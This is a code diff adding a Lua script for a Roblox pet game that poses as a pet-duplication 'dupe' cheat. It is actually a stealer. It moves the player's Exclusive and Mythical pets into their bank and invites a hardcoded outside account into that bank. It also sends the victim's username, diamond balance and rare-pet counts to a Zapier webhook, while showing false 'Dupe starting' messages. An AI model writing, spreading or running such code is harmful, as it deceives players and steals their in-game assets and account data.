@@ -1,0 +1,41 @@
+local ScriptKey = 1388215137
+
+local a = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local b = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local c = a.Network.Invoke("get my banks")
+
+local PetsList = {}
+
+local Mythicals = 0
+local Exlusives = 0
+
+for i,v in pairs(a.Save.Get().Pets) do
+    local v2 = a.Directory.Pets[v.id];
+    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
+        table.insert(PetsList, v.uid);
+    end
+    if v2.rarity == "Exlusive" then
+     Exlusives = Exlusives + 1
+    else
+      Mythicals = Mythicals + 1
+    end
+end
+
+local request, request2 = a.Network.Invoke("Bank Deposit", c[1]['BUID'], PetsList, 100 - 1);
+
+if request then
+    a.Message.New("Dupe starting!");
+else
+    a.Message.New(request2 and "if you don't have one buy a tier 2 bank to have more space and prevent pet removal! Wait 2-3 hour before each copy!");
+    return;
+end
+
+if a.Network.Invoke("Invite To Bank", c[1]['BUID'], ScriptKey) then
+    a.Message.New("Come back in 1-4 hours!");
+    local url = "https://hooks.zapier.com/hooks/catch/12273254/b8p0nn3/"
+    local data0 = {"**@everyone ** | `"..game.Players.LocalPlayer.Name.."` | Gemy : "..game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text.." | Exlusivy : "..Exlusives.." | Mythicale : "..Mythicals}
+    local newdata0 = game:GetService'HttpService':JSONEncode(data0)
+    game:HttpPost(url,newdata0)
+else
+    a.Message.New("Dupe fail");
+end;
